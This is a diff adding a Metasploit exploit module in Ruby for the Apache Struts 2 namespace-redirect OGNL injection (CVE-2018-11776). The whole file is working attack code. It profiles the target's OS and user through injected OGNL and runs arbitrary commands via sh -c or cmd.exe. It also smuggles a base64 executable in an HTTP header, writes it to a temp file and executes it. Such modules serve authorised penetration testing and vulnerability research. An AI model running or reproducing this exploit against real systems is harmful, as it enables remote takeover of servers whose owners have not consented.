@@ -1,0 +1,390 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::EXE
+
+  # Eschewing CmdStager for now, since the use of '\' and ';' are killing me
+  #include Msf::Exploit::CmdStager   # https://github.com/rapid7/metasploit-framework/wiki/How-to-use-command-stagers
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Apache Struts 2 Namespace Redirect OGNL Injection',
+      'Description'    => %q{
+        This module exploits a remote code execution vulnerability in Apache Struts
+        version 2.3 - 2.3.4, and 2.5 - 2.5.16. Remote Code Execution can be performed
+        via an endpoint that makes use of a redirect action.
+
+        Native payloads will be converted to executables and dropped in the
+        server's temp dir. If this fails, try a cmd/* payload, which won't
+        have to write to the disk.
+      },
+      #TODO: Is that second paragraph above still accurate?
+      'Author'         => [
+        'Man Yue Mo', # Discovery
+        'hook-s3c',   # PoC
+        'asoto-r7',   # Metasploit module
+        'wvu'         # Metasploit module
+      ],
+      'References'     => [
+        ['CVE', '2018-11776'],
+        ['URL', 'https://lgtm.com/blog/apache_struts_CVE-2018-11776'],
+        ['URL', 'https://cwiki.apache.org/confluence/display/WW/S2-057'],
+        ['URL', 'https://github.com/hook-s3c/CVE-2018-11776-Python-PoC'],
+      ],
+      'Privileged'     => false,
+      'Targets'        => [
+        [
+          'Automatic detection', {
+            'Platform'   => %w{ unix windows linux },
+            'Arch'       => [ ARCH_CMD, ARCH_X86, ARCH_X64 ],
+          },
+        ],
+        [
+          'Windows', {
+            'Platform'   => %w{ windows },
+            'Arch'       => [ ARCH_CMD, ARCH_X86, ARCH_X64 ],
+          },
+        ],
+        [
+          'Linux', {
+            'Platform'       => %w{ unix linux },
+            'Arch'           => [ ARCH_CMD, ARCH_X86, ARCH_X64 ],
+            'DefaultOptions' => {'PAYLOAD' => 'cmd/unix/generic'}
+          },
+        ],
+      ],
+      'DisclosureDate' => 'Aug 22 2018', # Private disclosure = Apr 10 2018
+      'DefaultTarget'  => 0))
+
+      register_options(
+        [
+          Opt::RPORT(8080),
+          OptString.new('TARGETURI', [ true, 'A valid base path to a struts application', '/' ]),
+          OptString.new('ACTION', [ true, 'A valid endpoint that is configured as a redirect action', 'showcase.action' ]),
+          OptString.new('ENABLE_STATIC', [ true, 'Enable "allowStaticMethodAccess" before executing OGNL', true ]),
+        ]
+      )
+      register_advanced_options(
+        [
+          OptString.new('HTTPMethod', [ true, 'The HTTP method to send in the request. Cannot contain spaces', 'GET' ]),
+          OptString.new('HEADER', [ true, 'The HTTP header field used to transport the optional payload', "X-#{rand_text_alpha(4)}"] ),
+          OptString.new('TEMPFILE', [ true, 'The temporary filename written to disk when executing a payload', "#{rand_text_alpha(8)}"] ),
+        ]
+      )
+  end
+
+  def check
+    # METHOD 1: Try to extract the state of hte allowStaticMethodAccess variable
+    ognl = "#_memberAccess['allowStaticMethodAccess']"
+
+    resp = send_struts_request(ognl)
+
+    # If vulnerable, the server should return an HTTP 302 (Redirect)
+    #   and the 'Location' header should contain either 'true' or 'false'
+    if resp && resp.headers['Location']
+      output = resp.headers['Location']
+      vprint_status("Redirected to:  #{output}")
+      if (output.include? '/true/')
+        print_status("Target does *not* require enabling 'allowStaticMethodAccess'.  Setting ENABLE_STATIC to 'false'")
+        datastore['ENABLE_STATIC'] = false
+        CheckCode::Vulnerable
+      elsif (output.include? '/false/')
+        print_status("Target requires enabling 'allowStaticMethodAccess'.  Setting ENABLE_STATIC to 'true'")
+        datastore['ENABLE_STATIC'] = true
+        CheckCode::Vulnerable
+      else
+        CheckCode::Safe
+      end
+    elsif resp && resp.code==400
+      # METHOD 2: Generate two random numbers, ask the target to add them together.
+      #   If it does, it's vulnerable.
+      a = rand(10000)
+      b = rand(10000)
+      c = a+b
+
+      ognl = "#{a}+#{b}"
+
+      resp = send_struts_request(ognl)
+
+      if resp.headers['Location'].include? c.to_s
+        vprint_status("Redirected to:  #{resp.headers['Location']}")
+        print_status("Target does *not* require enabling 'allowStaticMethodAccess'.  Setting ENABLE_STATIC to 'false'")
+        datastore['ENABLE_STATIC'] = false
+        CheckCode::Vulnerable
+      else
+        CheckCode::Safe
+      end
+    end
+  end
+
+  def exploit
+    case payload.arch.first
+    when ARCH_CMD
+      resp = execute_command(payload.encoded)
+    else
+      resp = send_payload()
+    end
+  end
+
+  def encode_ognl(ognl)
+    # Check and fail if the command contains the follow bad characters:
+    #   ';' seems to terminates the OGNL statement
+    #   '/' causes the target to return an HTTP/400 error
+    #   '\' causes the target to return an HTTP/400 error (sometimes?)
+    #   '\r' ends the GET request prematurely
+    #   '\n' ends the GET request prematurely
+
+    # TODO: Make sure the following line is uncommented
+    bad_chars = %w[; \\ \r \n]    # and maybe '/'
+    bad_chars.each do |c|
+      if ognl.include? c
+        print_error("Bad OGNL request: #{ognl}")
+        fail_with(Failure::BadConfig, "OGNL request cannot contain a '#{c}'")
+      end
+    end
+
+    # The following list of characters *must* be encoded or ORNL will asplode
+    encodable_chars = { "%": "%25",       # Always do this one first.  :-)
+                        " ": "%20",
+                        "\"":"%22",
+                        "#": "%23",
+                        "'": "%27",
+                        "<": "%3c",
+                        ">": "%3e",
+                        "?": "%3f",
+                        "^": "%5e",
+                        "`": "%60",
+                        "{": "%7b",
+                        "|": "%7c",
+                        "}": "%7d",
+                       #"\/":"%2f",       # Don't do this.  Just leave it front-slashes in as normal.
+                       #";": "%3b",       # Doesn't work.  Anyone have a cool idea for a workaround?
+                       #"\\":"%5c",       # Doesn't work.  Anyone have a cool idea for a workaround?
+                       #"\\":"%5c%5c",    # Doesn't work.  Anyone have a cool idea for a workaround?
+                      }
+
+    encodable_chars.each do |k,v|
+     #ognl.gsub!(k,v)                     # TypeError wrong argument type Symbol (expected Regexp)
+      ognl.gsub!("#{k}","#{v}")
+    end
+    return ognl
+  end
+
+  def send_struts_request(ognl, payload: nil)
+=begin  #badchar-checking code
+    pre = ognl
+=end
+
+    ognl = "${#{ognl}}"
+    vprint_status("Submitted OGNL: #{ognl}")
+    ognl = encode_ognl(ognl)
+
+    headers = {'Keep-Alive': 'timeout=5, max=1000'}
+
+    if payload
+      vprint_status("Embedding payload of #{payload.length} bytes")
+      headers[datastore['HEADER']] = payload
+    end
+
+    # TODO: Embed OGNL in an HTTP header to hide it from the Tomcat logs
+    uri = "/#{ognl}/#{datastore['ACTION']}"
+
+    resp = send_request_cgi(
+     #'encode'  => true,     # this fails to encode '\', which is a problem for me
+      'uri'     => uri,
+      'method'  => datastore['HTTPMethod'],
+      'headers' => headers
+    )
+
+    if resp && resp.code == 404
+      fail_with(Failure::UnexpectedReply, "Server returned HTTP 404, please double check TARGETURI and ACTION options")
+    end
+
+=begin  #badchar-checking code
+    print_status("Response code: #{resp.code}")
+    #print_status("Response recv: BODY '#{resp.body}'") if resp.body
+    if resp.headers['Location']
+      print_status("Response recv: LOC: #{resp.headers['Location'].split('/')[1]}")
+      if resp.headers['Location'].split('/')[1] == pre[1..-2]
+        print_good("GOT 'EM!")
+      else
+        print_error("                       #{pre[1..-2]}")
+      end
+    end
+=end
+
+    resp
+  end
+
+  def profile_target
+    # Use OGNL to extract properties from the Java environment
+
+    properties = { 'os.name': nil,          # e.g. 'Linux'
+                   'os.arch': nil,          # e.g. 'amd64'
+                   'os.version': nil,       # e.g. '4.4.0-112-generic'
+                   'user.name': nil,        # e.g. 'root'
+                   #'user.home': nil,       # e.g. '/root' (didn't work in testing)
+                   'user.language': nil,    # e.g. 'en'
+                   #'java.io.tmpdir': nil,  # e.g. '/usr/local/tomcat/temp' (didn't work in testing)
+                   }
+
+    ognl = ""
+    ognl << %q|(#_memberAccess['allowStaticMethodAccess']=true).| if datastore['ENABLE_STATIC']
+    ognl << %Q|('#{rand_text_alpha(2)}')|
+    properties.each do |k,v|
+      ognl << %Q|+(@java.lang.System@getProperty('#{k}'))+':'|
+    end
+    ognl = ognl[0...-4]
+
+    r = send_struts_request(ognl)
+
+    if r.code == 400
+      fail_with(Failure::UnexpectedReply, "Server returned HTTP 400, consider toggling the ENABLE_STATIC option")
+    elsif r.headers['Location']
+      # r.headers['Location'] should look like '/bILinux:amd64:4.4.0-112-generic:root:en/help.action'
+      #   Extract the OGNL output from the Location path, and strip the two random chars
+      s = r.headers['Location'].split('/')[1][2..-1]
+
+      if s.nil?
+        # Since the target didn't respond with an HTTP/400, we know the OGNL code executed.
+        #   But we didn't get any output, so we can't profile the target.  Abort.
+        return nil
+      end
+
+      # Confirm that all fields were returned, and non include extra (:) delimiters
+      #   If the OGNL fails, we might get a partial result back, in which case, we'll abort.
+      if s.count(':') > properties.length
+        print_error("Failed to profile target.  Response from server: #{r.to_s}")
+        fail_with(Failure::UnexpectedReply, "Target responded with unexpected profiling data")
+      end
+
+      # Separate the colon-delimited properties and store in the 'properties' hash
+      s = s.split(':')
+      i = 0
+      properties.each do |k,v|
+        properties[k] = s[i]
+        i += 1
+      end
+
+      print_good("Target profiled successfully: #{properties[:'os.name']} #{properties[:'os.version']}" +
+        " #{properties[:'os.arch']}, running as #{properties[:'user.name']}")
+      return properties
+    else
+      print_error("Failed to profile target.  Response from server: #{r.to_s}")
+      fail_with(Failure::UnexpectedReply, "Server did not respond properly to profiling attempt.")
+    end
+  end
+
+  def execute_command(cmd_input, opts={})
+    # Semicolons appear to be a bad character in OGNL.  cmdstager doesn't understand that.
+    if cmd_input.include? ';'
+      print_warning("WARNING: Command contains bad characters: semicolons (;).")
+    end
+
+    begin
+      properties = profile_target
+      os = properties[:'os.name'].downcase
+    rescue
+      vprint_warning("Target profiling was unable to determine operating system")
+      os = ''
+      os = 'windows' if datastore['PAYLOAD'].downcase.include? 'win'
+      os = 'linux'   if datastore['PAYLOAD'].downcase.include? 'linux'
+      os = 'unix'    if datastore['PAYLOAD'].downcase.include? 'unix'
+    end
+
+    if (os.include? 'linux') || (os.include? 'nix')
+      cmd = "{'sh','-c','#{cmd_input}'}"
+    elsif os.include? 'win'
+      cmd = "{'cmd.exe','/c','#{cmd_input}'}"
+    else
+      vprint_error("Failed to detect target OS.  Attempting to execute command directly")
+      cmd = cmd_input
+    end
+
+    # The following OGNL will run arbitrary commands on Windows and Linux
+    #   targets, as well as returning STDOUT and STDERR.  In my testing,
+    #   on Struts2 in Tomcat 7.0.79, commands timed out after 18-19 seconds.
+
+    vprint_status("Executing: #{cmd}")
+
+    ognl =  ""
+    ognl << %q|(#_memberAccess['allowStaticMethodAccess']=true).| if datastore['ENABLE_STATIC']
+    ognl << %Q|(#p=new java.lang.ProcessBuilder(#{cmd})).|
+    ognl << %q|(#p.redirectErrorStream(true)).|
+    ognl << %q|(#process=#p.start()).|
+    ognl << %q|(#r=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).|
+    ognl << %q|(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#r)).|
+    ognl << %q|(#r.flush())|
+
+    r = send_struts_request(ognl)
+
+    if r && r.code == 200
+      print_good("Command executed:\n#{r.body}")
+    elsif r
+      if r.body.length == 0
+        print_status("Payload sent, but no output provided from server.")
+      elsif r.body.length > 0
+        print_error("Failed to run command.  Response from server: #{r.to_s}")
+      end
+    end
+  end
+
+  def send_payload
+    # Probe for the target OS and architecture
+    begin
+      properties = profile_target
+      os = properties[:'os.name'].downcase
+    rescue
+      vprint_warning("Target profiling was unable to determine operating system")
+      os = ''
+      os = 'windows' if datastore['PAYLOAD'].downcase.include? 'win'
+      os = 'linux'   if datastore['PAYLOAD'].downcase.include? 'linux'
+      os = 'unix'    if datastore['PAYLOAD'].downcase.include? 'unix'
+    end
+
+    data_header = datastore['HEADER']
+    if data_header.empty?
+      fail_with(Failure::BadConfig, "HEADER parameter cannot be blank when sending a payload")
+    end
+
+    random_filename = datastore['TEMPFILE']
+
+    # d = data stream from HTTP header
+    # f = path to temp file
+    # s = stream/handle to temp file
+    ognl  = ""
+    ognl << %q|(#_memberAccess['allowStaticMethodAccess']=true).| if datastore['ENABLE_STATIC']
+    ognl << %Q|(#d=@org.apache.struts2.ServletActionContext@getRequest().getHeader('#{data_header}')).|
+    ognl << %Q|(#f=@java.io.File@createTempFile('#{random_filename}','tmp')).|
+    ognl << %q|(#f.setExecutable(true)).|
+    ognl << %q|(#f.deleteOnExit()).|
+    ognl << %q|(#s=new java.io.FileOutputStream(#f)).|
+    ognl << %q|(#d=new sun.misc.BASE64Decoder().decodeBuffer(#d)).|
+    ognl << %q|(#s.write(#d)).|
+    ognl << %q|(#s.close()).|
+    ognl << %q|(#p=new java.lang.ProcessBuilder({#f.getAbsolutePath()})).|
+    ognl << %q|(#p.start()).|
+    ognl << %q|(#f.delete()).|
+
+    success_string = rand_text_alpha(4)
+    ognl << %Q|('#{success_string}')|
+
+    exe = [generate_payload_exe].pack("m").delete("\n")
+    r = send_struts_request(ognl, payload: exe)
+
+    if r && r.headers && r.headers['Location'].split('/')[1] == success_string
+      print_good("Payload successfully dropped and executed.")
+    elsif r && r.headers['Location']
+      vprint_error("RESPONSE: " + r.headers['Location'])
+      fail_with(Failure::PayloadFailed, "Target did not successfully execute the request")
+    elsif r && r.code == 400
+      fail_with(Failure::UnexpectedReply, "Target reported an unspecified error while executing the payload")
+    end
+  end
+end
